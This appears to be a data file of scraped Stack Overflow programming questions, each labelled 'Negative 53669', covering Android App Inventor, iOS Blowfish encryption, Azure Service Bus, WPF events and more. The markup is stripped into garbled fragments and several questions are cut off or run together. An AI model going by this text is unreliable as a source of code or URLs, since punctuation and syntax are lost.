Negative 53669 pHi Guys Im new to programming Android devices I do have python, java, C, C, C, PHP, Bash and Visual Basic Experience but Im new to this block programming, and I havent done much work with forms. Im trying to get make an application that posts data to an external IP. I have successsfully wrote a server and a windows based client, clicking buttons in my windows client posts data to the ip 192.168.1.9 port 9999. This is just in the testing phase to remote control a bunch of beaglebone gpios. So far Ive had great success with the windows side. In app inventor for android, However, Ive created a series of buttons and tabs, different buttons post text or post and poll for response. The problem I have is that I can directly attach the web connector to 192.168.1.9 but when I add in the port 9999 it tells me the address is incorrect. The method Im using isp  precodewhen Screen1.initialize do set Web1.Url to http192.168.1.99999  when Button1.Click do call Web1.PostText              text gt 0 codepre  pAgain, if I type in just the IP of the beaglebone I see its ethernet port go crazy when I click button1. It does nothing when I add in the port. Of course my server is running on 9999 since port 80 is reserved for the internet. Any suggestionsp

Negative 53669 pI developed an iPhone app and want to extend this app for the iPad. Therefore I copied the XIBs and changed the document type from codecom.apple.InterfaceBuilder3.CocoaTouch.XIBcode to codecom.apple.InterfaceBuilder3.CocoaTouch.iPad.XIBcode and named the XIBs as follows UIFile.xib as UIFileiPad.xib p  pNow I tried to change the size from the views inside the attribute inspector from iPhone to iPad Full Screen. It worked for the launch screen, but not for the localized XIBs. I can change the values directly in the source code, but it has no affect for the graphical view inside the Interface Builder. They just have the same sizes as for the iPhone XIBs. Now it is difficult to place the view components like buttons at new position.p  pHow can I resize the View to iPad Full Screenp

Negative 53669 pSo, for learning purposes, I am writing a chat application with Node and Express. I use MongoDBMongoose, Passport for authentification, and socket.io for the actual chat part of the app.p  pI have a working registrationloginlogout system. My problem is in the socket.io code. When I emit a message from a client, I want to know in the severside code, from what user the message originated. So, in PHP for example, I would save the user name in a session variable upon login, and later use it from somehwere else.

The problem is that the URL we call must be accompanied with some parameters encrypted using Blowfish with ECB mode.p  pThis 3rd party uses PHP to encryptdecrypt the parameters and they have given me the code they are using to do the encryption and decryption.p  pBased on that, in my iOS project, Im using the FclBlowfish library a hrefhttpsgithub.comcantecimFclBlowfish relnofollowhttpsgithub.comcantecimFclBlowfisha to encryptdecrypt the data.p  pAfter doing everything, the encryptiondecryption was not working correctly, and the problem I just found out, after almost 5 hours working on this that in iOS the encryption is almost the same as PHP, but since blowfish generates weird characters, some of them were not being handled by iOS, making the decryption not work.p  pAn example isp  pIn PHP, my encrypted string is codepFEamp 4ncode but in iOS the same encrypted string is codepFEamp4ncode as you can see, iOS is missing the strongstrong and strongstrong, making the final encrypted string different, so PHP cannot decrypt correctly.p  pThe Code Im using on iOS isp  precodeFclBlowfish bf  [[FclBlowfish alloc] init] bf.Key  MyK3yF8n bf.IV  aaassss [bf prepare]  [bf encrypt21988882121 withModemodeEBC withPaddingpaddingZero] codepre  pThe encryptiondecryption code this lib uses can be seen at a hrefhttpsgithub.comcantecimFclBlowfishblobmasterFclBlowfish.m relnofollowhttpsgithub.comcantecimFclBlowfishblobmasterFclBlowfish.map  pand the code in PHP isp  precodeinitializationVectorSize  mcryptgetivsizeMCRYPTBLOWFISH, ecb initializationVector  mcryptcreateivinitializationVectorSize, MCRYPTRAND   Decrypt valor  GET[v] valor  base64decodevalor  valor  mcryptdecryptMCRYPTBLOWFISH, MyK3yF8n, valor, ecb, initializationVector  print Valor  . valor   Encrypt v  mcryptencryptMCRYPTBLOWFISH, MyK3yF8n, valor, ecb, initializationVector  print v codepre  pI would appreciate any help trying to figure out why iOS is missing some charecters, making the string nondecryptable in PHP.p  pThanksp  pstrongUPDATEstrongp  pSo I opened the FclBlowfish code and saw that they were using the strongNSISOLatin1StringEncodingstrong and strongNSASCIIStringEncodingstrong Encoding in the Encryption and Decryption methods, then I decided to try a few others and found out that using strongNSWindowsCP1252StringEncodingstrong actually returns the correct encoding as the PHP one and decryption works like a charmp

Negative 53669 pI have an app where the user should be able to create template settings files, to save and choose from a popup list. These settings will be applied to configure an export of an item.p  pI just dont know how to best approach the problem of saving and restoring the saved settings.p  pTo add to my problem is the fact that there are many different exporting methods, each with different setting types.p  pTo explainp  pUser configures the settings they want for export method A, heshe saves these settings and here i want to write them to disk in a plist file.p  pThe the user configures another set of settings for export method B, heshe saves these settings and i want to write these to disk aswell.p  pI have used NSSharedUsersDefaultsController to bind all interface elements and test bindings, but i dont want to keep all settings in the application plist. Also, I dont know if there is a good way of importingexporting using that technique when im using different subset of settings. If there was a good way of binding to subdictionaries then that could work, but I have not been able to make that work.p  pI could create a Class for each export method and bind the settings to an NSObjectController, and then manually create an import and export method but that felt clunky.p  pNSDictionaryController and NSArrayController only seem to be made for TableViews and that kind of data display, not single user interface elements, at least from what ive been able to test.p  pSo, is there a good way to create an exportimport functionality while still using cocoa bindings, or do i have to create my own methods for thatp  pAny examples or pointers in the right direction is appreciated.p

Negative 53669 pI am trying to figure out how to change over my code from writingreading from a database, to storing items into an ArrayList HashMap of Strings. basically every interval, it will repopulate this list, and display it to the user.

Negative 53669 pI have a very specific problem. Im creating a word list app that basically lets me enter some words and their meanings and stores them in an SQLite database and then it shows them back to me. Ive made my own content provider to handle all these interactions. I store the words in one table and the definitions in another table and these two tables are linked together through the books unique id. Im also using a CursorLoader and a CursorAdapter to populate my listView in my MainActivity. Now my problem is when I get the list of the words that I have in my database, some of the words have more than one definition and I have to query against the database as Im drawing each list item in my listView to find the definitions and put them on the list. This has caused my listView to stutter. Ive even tried to use AsyncTask but I dont want to start a new thread every time a word is getting added to my listView at runtime. Is there any efficient, right way to do thisp  pThis is my CursorAdapter class where I believe is the source of the problem.p  precodepublic class WordAdapter extends CursorAdapter   public static

Negative 53669 pMy application is required to publish messages to thousands of clients with high throughput requirements hundreds of, maybe 1000 messages per second in order to keep local client databases in sync with the server database. Every server database operation would potentially require a message to be published to a location of 20 or less clients. Clients only have database information for their particular location. Thousands of locations exist.p  pMy idea was to use Azure Service Bus topicsubscription model for this. Each client would establish a subscription and connection to the database sync topic and receive filtered messages for their location.p  pHowever, according to the a hrefhttpsmsdn.microsoft.comenuslibraryazureee732538.aspx relnofollowAzure Service Bus Quota pagea, I am limited to the followingp  ul liNumber of concurrent connections on a namespace  1,000li liNumber of concurrent connections on a queuetopicsubscription entity  Capped by the limit of concurrent connections per namespace.li liNumber of subscriptions per topic  2,000li ul  pWith these limitations now in mind, my solution does not seem usable. What is the best approach to solving this problem using Azure Service Bus To get around the subscriptions per topic limit I could just create a topic per location. However, the killer really is the number of concurrent connections on a topicnamespace I think. All clients would be subscribed and longpolling for sync messages to come down from each topic and that would be thousands. Would I need to create a new namespace and topic per location This seems problematic since I would have to open a new connection each time I want to publish from the server which is very frequent.p  pIs Azure Service Bus not the correct solution for this problemp

Negative 53669 pIve got a web application that uses iframes to load various panels into view. At times, there are jQuery UI tabs in use to bring panels to the forefront while hiding others that are not in use. In this specific instance, one of the iframes contains jQuery UI tabs, which in turn contains iframes. And in some instances, inside that iframe, an additional iframe is used to load yet another panel of software. For the most part, this all works well. However, in the instance of this fourth level iframe, in Internet Explorer, if you change jQuery UI tabs and then return to show this specific one, the innermost iframe remains whited out. Oddly, doing just about anything, such as collapsing an adjacent panel, clicking other unrelated jquery tabs elsewhere, or toggling CSS properties in the DOM Explorer will jostle the iframe back into view.p  precodelthtmlgt ltbodygt ... ltDIV styleHEIGHT 858px WIDTH 1680pxgt     ltIFRAME styleHEIGHT 100 WIDTH 100 src... frameBorder0 scrollingyesgtltIFRAMEgt ltDIVgt ... ltbodygt lthtmlgt codepre  pInside that iframe, full html including lthtmlgt and ltbodygt tags.p  precodeltdiv classuitabspanelgt     ltiframe src...gtltiframegt ltdivgt codepre  pSo this seems to be an obscure jQuery UI bug relating to Internet Explorer. Id like to avoid putting some kind of code change into my jqueryui.js file, though I havent found a fix for it yet, so Im looking for ideas on what I can do to jostle the inner iframe back into view when you click on the jQuery UI tab.p

Negative 53669 pI am confused with codeStaticcode implementation in VB.NET. In C, we can create Static class and static methods to write utility methods for our application.

But in my application, I have written the below code p  precodePublic Class Utility      Public Shared Function GetValue As String        My code      End Function End Class codepre  pBy writing the code, I am able to access the utility method as codeUtility.GetValuecode. As this is not a static class, I am supposed to instantiate an object of it. But this method is available for both the class and objects of codeUitlitycodep  pNow my questions arep  ol liIs the implementation I have done may violate any of the features of static class that module provideli liWhat will be difference between this and implementing a module insteadli liIf I create a module instead, will the scope of that will be same as this class I want to access the method throughout the project as well as other projects where this one is referenced.li ol  pI tried consulting multiple articles, but nowhere found this exact answers.

Without the form tags, the box slides up and down as it should. Add the form tags and the box will slide as if collapsing when the slideClose button is clicked but will return to the down position.

Negative 53669 pMy application is native windows application MFCWin32 which loads .NET plugins via COM. The application exposes its document model via COM implemented in ATL.p  pI have a line of code which looks like this on the .NET sidep  pcodevar settings  Application.UserSettingscodep  pWith a breakpoint in my WMPAINT handler in the native application, the breakpoint will trigger on this line amongst others. Im not able to see the stack trace past this point but I assume it stopped execution in the WMPAINT handler, since it contains my only breakpoint, but Im not able to see the stack past the RCW.p  pI suspect that in the codegetUserSettingscode property getter, the RCW will handle WMPAINT. I disabled the WMPAINT dispatching as described a hrefhttpblogs.msdn.combyvesdolcarchive20090806doyoureceivewmpaintwhenwaitingforacomcalltoreturn.aspx relnofollowthis articlea and the WMPAINT dispatching stopped, which goes a long way towards confirming my suspicion.p  pThis all happens on the UI thread which is STA. The COM object is STA and was created on the UI thread. I thought COMRCW would only handle WMPAINT when doing crossapartment marshaling, while it waits for the method call to finish executing.p  pMy question is Why does the RCW handle WMPaint in this casep

Negative 53669 pIve almost finished my first angular.js app. Currently Im trying to optimize page speed. Whole app is single page app so pages content is loading thew ajax. Initial load time on computer is around 5 secondsmight be problem but now its ok. Other pages are loading in 200400msmostly time for first byte takes 300ms, so its quite fast.p  pProblem is load time on mobile devices. Its starting from 10 seconds to 20 maybe on low ram phones even more. What should I do I compressed all scrips, styles, merged them into 1 file. When I make a test on webpagetest.org I got marks C A A A B so its good, also on gtmetrix.com I got PageSpeed Score 97,YSlow Score87. Huhp  pProblem might be in size of page. Im transfering 1.4mb on first load. Scripts has around 600kb, css 340kbbut its all minified. Im using angularmaterial which has around 200kb.p  pWhat should I do I tried do optimize everything what I found on google, but it doesnt seems to help much. Is there any other way what can I improve or its lost and it gonna be as slow as it is foreverp

Negative 53669 pstrongEDITstrong I emthinkem I solved the problem. I will add my own answersolution as soon as I am at work again tomorrow.p  hr  pI am working on a kernel module for the Linux kernel 3.16.x. My module is supposed to receive and send ethernet frames, so I created two threads. One for the receive part, one for the transmit part. It is working fine.p  pMy issue appears when I try to close the device file of the module and unload it. To be precise, it happens when trying to kill my threads. The machine I am testing on a virtual machine, with Ubuntu 14.04 freezes before there is any output whatsoever. However, when I remove the thread killing part from the code, it does not freeze anymore.

Negative 53669 pOn Windows, one can get any special folder path using codeSHGetKnownFolderPathcode or codeSHGetSpecialFoldercode If I remember correctly this last one. However, I want the reverse, I have a path and want to know which special folder it belongs to, if any. I prefer this approach, because to find out if a given paths is in a particular special folder or not, Ill have to enumerate all special folders for all users which is a bit of ugly, but if theres no other way, the sky is the limit p  pI searched it but couldnt find anything useful. So does WinApi has a function to do just thatp  pThanks.p

Negative 53669 pI use C for creating different types of Wizardlike applications. In the beginning I was using WinForms and a tabcontrol to guide users through different choices, but now Im using WPF and pages. This way its much cleaner and easier to modify. It works just as I need it to, but once thing Im now struggling with are events.p  pFor example I have the following structure a photo booth applicationp  precode MasterPage.xaml  Welcome.xaml  Photo.xaml  Preview.xaml  Done.xaml codepre  pIn this case I create a MasterPage that holds the overall theme and a frame that can hold the content pages. The welcomepage is loading on startup, the user clicks next, takes a picture and is automatically transferred to the preview page. From here the user can either retake the photo or quit and be presented with the Done page. I hope that somewhat makes sense...p  pAnyway, my issue is that I dont really know how to use objects that fires events. In this case I have a CameraHandler object that has multiple events like ImageTaken or PreviewUpdated.p  pAt first I defined a new instance of CameraHandler  each time the pages Photo was loaded and disposed of it when the pageunload got triggered. In order to pass the image to the next page I just used the event ImageTaken to save the image to a user object for that current session. However, if a user kept taking pictures and then retake it, the CameraHandler would be created and disposed too many times and resulting in crashing the application. The Windows event viewer actually said that it disconnects the camera because of a driver error. Is this still a preferable way of handling events creating them often and disposing themp  pSo Im not sure what to do. Ive tried to define the CameraHandler in the MasterPage or an external class as a public variable in order to not dispose it all the time, but that didnt work out too well either. Now I dont create a new instance of the CameraHandler object, but events are getting fired multiple times since it adds the events every time the user reload that Photo.xaml page where the event handlers are defined...p  pI hope someone understands the issue and has some word of advise.  This is not about a specific case, but more a general question about pages and events.p  pstrongEditstrong Heres the code for the Photo.xaml a hrefhttppastebin.comXZBkLj4k relnofollowhttppastebin.comXZBkLj4kap
